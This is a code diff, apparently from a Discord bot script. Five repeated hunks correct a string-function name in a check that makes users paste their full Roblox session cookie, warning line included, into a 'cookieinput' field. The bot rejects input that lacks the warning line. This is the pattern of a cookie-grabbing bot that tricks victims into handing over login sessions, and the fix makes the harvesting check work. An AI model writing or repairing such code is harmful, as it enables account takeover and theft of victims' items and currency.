@@ -108,7 +108,7 @@ Thanks!
 }
 ]
 
-$onlyif[$stringStartWith[$textinputvalue[cookieinput];_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_]==true;
+$onlyif[$stringStartsWith[$textinputvalue[cookieinput];_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_]==true;
 {
     "embeds" : "{newEmbed:{description:Your Token Must Include The Warning Line!}{color:ff0000}}",
     "ephemeral" : true,
@@ -187,7 +187,7 @@ Thanks!
 }
 ]
 
-$onlyif[$stringStartWith[$textinputvalue[cookieinput];_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_]==true;
+$onlyif[$stringStartsWith[$textinputvalue[cookieinput];_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_]==true;
 {
     "embeds" : "{newEmbed:{description:Your Token Must Include The Warning Line!}{color:ff0000}}",
     "ephemeral" : true,
@@ -266,7 +266,7 @@ Thanks!
 }
 ]
 
-$onlyif[$stringStartWith[$textinputvalue[cookieinput];_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_]==true;
+$onlyif[$stringStartsWith[$textinputvalue[cookieinput];_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_]==true;
 {
     "embeds" : "{newEmbed:{description:Your Token Must Include The Warning Line!}{color:ff0000}}",
     "ephemeral" : true,
@@ -345,7 +345,7 @@ Thanks!
 }
 ]
 
-$onlyif[$stringStartWith[$textinputvalue[cookieinput];_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_]==true;
+$onlyif[$stringStartsWith[$textinputvalue[cookieinput];_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_]==true;
 {
     "embeds" : "{newEmbed:{description:Your Token Must Include The Warning Line!}{color:ff0000}}",
     "ephemeral" : true,
@@ -424,7 +424,7 @@ Thanks!
 }
 ]
 
-$onlyif[$stringStartWith[$textinputvalue[cookieinput];_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_]==true;
+$onlyif[$stringStartsWith[$textinputvalue[cookieinput];_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_]==true;
 {
     "embeds" : "{newEmbed:{description:Your Token Must Include The Warning Line!}{color:ff0000}}",
     "ephemeral" : true,
